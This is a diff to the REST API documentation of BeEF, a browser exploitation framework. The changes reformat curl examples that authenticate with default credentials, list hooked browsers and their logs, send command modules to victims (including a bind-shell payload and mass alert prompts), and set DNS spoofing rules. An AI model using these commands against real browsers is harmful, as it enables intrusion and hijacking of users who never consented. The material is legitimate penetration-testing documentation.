@@ -9,12 +9,14 @@ The pseudo-random token is newly generated every time BeEF starts, using _BeEF::
 and is then added to the _BeEF::Configuration_ object. It can be retrieved at any time via ruby using `BeEF::Core::Configuration.instance.get('beef.api_token')`
 
 When BeEF starts, look at the console output for 
-`[16:02:47][*] RESTful API key: 320f3cf4da7bf0df7566a517c5db796e73a23f47`
+`[16:02:47][*] RESTful API key: 320f3cf4da7bf0df7566a517c5db796e73a23f47
 
 Alternatively, for example if you want to write automated scripts that use the RESTful API, you can issue a POST request to `/api/admin/login` using the BeEF credentials you will find in the main config.yaml file.
 An example with curl: 
-```bash
-curl -H "Content-Type: application/json" -X POST -d '{"username":"beef", "password":"beef"}' http://127.0.0.1:3000/api/admin/login
+```
+curl -H "Content-Type: application/json" \
+     -X POST -d '{"username":"beef", "password":"beef"}'\
+     http://127.0.0.1:3000/api/admin/login
 
 response: {"success":true,"token":"8dc651e5ee1cb06003878bb26bd0e72800caeea0"}
 ```
@@ -32,7 +34,7 @@ In this way you can parse the JSON response grabbing the token, and use it for y
 ### Example
 
 **Request**: 
-```bash
+```
 curl http://beefserver.com:3000/api/hooks?token=320f3cf4da7bf0df7566a517c5db796e73a23f47
 ```
 
@@ -81,7 +83,7 @@ In order to retrieve relative hooked browser details (like enabled plugins and t
 
 **Request**:
 
-```bash
+```
 curl http://beefserver.com:3000/api/hooks/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk?token=320f3cf4da7bf0df7566a517c5db796e73a23f47
 ```
 
@@ -123,8 +125,8 @@ curl http://beefserver.com:3000/api/hooks/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDw
 ### Example
 
 **Request** :
-```bash
-curl http://beefserver.com:3000/api/logs?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
+```
+curl http://beefserver.com:3000/api/logs?token=320f3cf4da7bf0df7566a517c5db796e73a23f47
 ```
 **Response (snip)**
 
@@ -160,10 +162,10 @@ In order to retrieve relative hooked browser logs, so events that are logged for
 
 ### Example
 
-** Request**:
+**Request**
 
-```bash
-curl http://beefserver.com:3000/api/logs/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
+```
+curl http://beefserver.com:3000/api/logs/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk?token=320f3cf4da7bf0df7566a517c5db796e73a23f47
 ```
 
 **Response (snip)**
@@ -210,8 +212,8 @@ curl http://beefserver.com:3000/api/logs/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwa
 
 **Request** 
 
-```bash
-curl http://beefserver.com:3000/api/modules?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
+```
+curl http://beefserver.com:3000/api/modules?token=320f3cf4da7bf0df7566a517c5db796e73a23f47
 ```
 
 **Response (snip)**
@@ -252,8 +254,8 @@ curl http://beefserver.com:3000/api/modules?token=320f3cf4da7bf0df7566a517c5db79
 ### Example
 **Request**:
 
-```bash
-curl http://beefserver.com:3000/api/modules/71?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
+```
+curl http://beefserver.com:3000/api/modules/71?token=320f3cf4da7bf0df7566a517c5db796e73a23f47
 ```
 
 **Response**:
@@ -289,8 +291,10 @@ NOTE: the request header must contain `Content-Type: application/json; charset=U
 
 **Request** :
 
-```bash
-curl -H "Content-Type: application/json; charset=UTF-8" -d '{"question":"wtf?"}' -X POST http://beefserver.com:3000/api/modules/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk/71?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
+```
+curl -H "Content-Type: application/json; charset=UTF-8" \
+     -d '{"question":"wtf?"}' -X POST \
+     http://beefserver.com:3000/api/modules/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk/71?token=320f3cf4da7bf0df7566a517c5db796e73a23f47
 ```
 
 **Response** :
@@ -317,8 +321,8 @@ Reusing the previous example, we want to know the command module execution resul
 
 **Request** :
 
-```bash
-curl http://beefserver.com:3000/api/modules/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk/71/1?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
+```
+curl http://beefserver.com:3000/api/modules/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk/71/1?token=320f3cf4da7bf0df7566a517c5db796e73a23f47
 ```
 
 **Response**:
@@ -346,8 +350,10 @@ NOTE: the request header must contain `Content-Type: application/json; charset=U
 
 **Request** :
 
-```bash
-curl -H "Content-Type: application/json; charset=UTF-8" -d '{"SRVPORT":"3992", "URIPATH":"77345345345dg", "PAYLOAD":"generic/shell_bind_tcp"}' -X POST http://beefserver.com:3000/api/modules/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk/236?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
+```
+curl -H "Content-Type: application/json; charset=UTF-8" \
+     -d '{"SRVPORT":"3992", "URIPATH":"77345345345dg", "PAYLOAD":"generic/shell_bind_tcp"}' \
+    -X POST http://beefserver.com:3000/api/modules/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk/236?token=320f3cf4da7bf0df7566a517c5db796e73a23f47
 ```
 
 **Response**
@@ -378,8 +384,10 @@ NOTE: Alert module with custom text, 2 hooked browsers.
 
 **Request** :
 
-```bash
-curl -H "Content-Type: application/json; charset=UTF-8" -d '{"mod_id":110,"mod_params":{"text":"vadi?"},"hb_ids":[1,2]}' -X POST http://beefserver.com:3000/api/modules/multi?token=2316d82702b83a293e2d46a0886a003a6be0a633
+```
+curl -H "Content-Type: application/json; charset=UTF-8" \
+     -d '{"mod_id":110,"mod_params":{"text":"vadi?"},"hb_ids":[1,2]}' -X POST \
+     http://beefserver.com:3000/api/modules/multi?token=2316d82702b83a293e2d46a0886a003a6be0a633
 ```
 
 **Response**
@@ -407,8 +415,11 @@ NOTE: Alert module with custom text, 2 hooked browsers. For modules that don't n
 
 **Request** :
 
-```bash
-curl -H "Content-Type: application/json; charset=UTF-8" -d '{"hb":"vkIwVV3ok5i5vH2f8sxlkoaKqAGKCbZXdWqE9vkHNFBhI8aBBHvtZAGRO2XqFZXxThBlmKlRiVwPeAzj","modules":[{"mod_id":99,"mod_input":[{"repeat":"10"},{"repeat_string":"ABCDE"}]},{"mod_id":116,"mod_input":[{"question":"hooked?"}]},{"mod_id":128,"mod_input":[]}]}' -X POST http://beefserver.com:3000/api/modules/multi_module?token=e640483ae9bca2eb904f003f27dd4bc83936eb92
+```
+curl -H "Content-Type: application/json; charset=UTF-8" \
+     -d '{"hb":"vkIwVV3ok5i5vH2f8sxlkoaKqAGKCbZXdWqE9vkHNFBhI8aBBHvtZAGRO2XqFZXxThBlmKlRiVwPeAzj","modules":[{"mod_id":99,"mod_input":[{"repeat":"10"},{"repeat_string":"ABCDE"}]},{"mod_id":116,"mod_input":[{"question":"hooked?"}]},{"mod_id":128,"mod_input":[]}]}' \
+     -X POST \
+     http://beefserver.com:3000/api/modules/multi_module?token=e640483ae9bca2eb904f003f27dd4bc83936eb92
 ```
 
 **Response**
@@ -433,7 +444,7 @@ NOTE: the following means the Alert Dialog module execution had issues (returnin
 
 **Request**
 
-```bash
+```
 curl http://beefserver.com:3000/api/dns/ruleset?token=320f3cf4da7bf0df7566a517c5db796e73a23f47
 ```
 
@@ -502,7 +513,7 @@ curl http://beefserver.com:3000/api/dns/ruleset?token=320f3cf4da7bf0df7566a517c5
 
 **Request**
 
-```bash
+```
 curl http://beefserver.com:3000/api/dns/rule/7e64183?token=320f3cf4da7bf0df7566a517c5db796e73a23f47
 ```
 
@@ -535,7 +546,7 @@ curl http://beefserver.com:3000/api/dns/rule/7e64183?token=320f3cf4da7bf0df7566a
 
 **Request**
 
-```bash
+```
 curl -H "Content-Type: application/json; charset=UTF-8" -d '{"pattern": "example.com", "resource": "A", "response": [ "10.0.2.14" ]}' -X POST http://beefserver.com:3000/api/dns/rule?token=320f3cf4da7bf0df7566a517c5db796e73a23f47
 ```
 
@@ -561,7 +572,7 @@ curl -H "Content-Type: application/json; charset=UTF-8" -d '{"pattern": "example
 
 **Request**
 
-```bash
+```
 curl -X DELETE http://beefserver.com:3000/api/dns/rule/45ce397?token=320f3cf4da7bf0df7566a517c5db796e73a23f47
 ```
 
